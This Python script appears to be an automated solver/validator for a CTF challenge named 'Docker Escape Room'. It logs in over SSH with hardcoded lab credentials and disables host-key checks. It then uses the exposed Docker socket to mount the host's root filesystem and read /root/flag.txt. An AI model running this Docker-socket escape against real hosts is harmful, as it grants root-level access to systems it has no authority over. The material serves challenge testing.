#!/usr/bin/env python3
"""
solve.py - Validador automático para "Docker Escape Room" (soporta GUIDs y flags dinámicas de GZCTF)
"""
import sys
import re
import subprocess

HOST = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = sys.argv[2] if len(sys.argv) > 2 else "2223"
USER = "ctfuser"
PASS = "ctf_docker_2024"

cmd = [
    "sshpass", "-p", PASS,
    "ssh",
    "-o", "StrictHostKeyChecking=no",
    "-o", "UserKnownHostsFile=/dev/null",
    "-o", "ConnectTimeout=15",
    "-p", str(PORT),
    f"{USER}@{HOST}",
    "docker -H unix:///var/run/docker.sock run --rm -v /:/mnt alpine:latest cat /mnt/root/flag.txt"
]

print(f"[*] Conectando a {USER}@{HOST}:{PORT}...")
res = subprocess.run(cmd, capture_output=True, text=True)
if res.returncode != 0:
    print(f"[!] Error ejecutando SSH:\n{res.stderr}")
    sys.exit(1)

output = res.stdout.strip()
print(f"[*] Salida del contenedor:\n{output}")

# Soporta banderas dinámicas con GUID (GZCTF) y formatos estándar
match = re.search(r"(?:CHRONOS|FLAG|flag)\{[a-zA-Z0-9_\-]{8,64}\}", output)
if match:
    flag = match.group(0)
    print(f"\n[+] [FLAG RECUPERADA] => {flag}\n")
    sys.exit(0)
else:
    print("[!] No se encontró una bandera válida en la salida.")
    sys.exit(1)
